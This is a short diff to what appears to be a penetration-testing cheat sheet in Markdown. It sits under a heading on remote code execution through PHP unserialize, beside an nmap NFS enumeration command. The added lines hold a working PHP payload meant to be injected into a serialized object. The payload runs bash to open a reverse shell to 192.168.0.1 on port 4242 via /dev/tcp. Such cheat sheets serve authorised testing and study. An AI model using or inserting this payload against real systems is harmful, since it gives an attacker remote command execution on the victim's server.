@@ -18,6 +18,8 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 192.168.0.1
 + <b>RCE via PHP Unserialize</b>
 ```
 https://notsosecure.com/remote-code-execution-via-php-unserialize/
++ serialize as necessary as a parameter
+public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/192.168.0.1/4242 0>&1\'"); ?>';
 ```
 
 ## Reverse Shells:
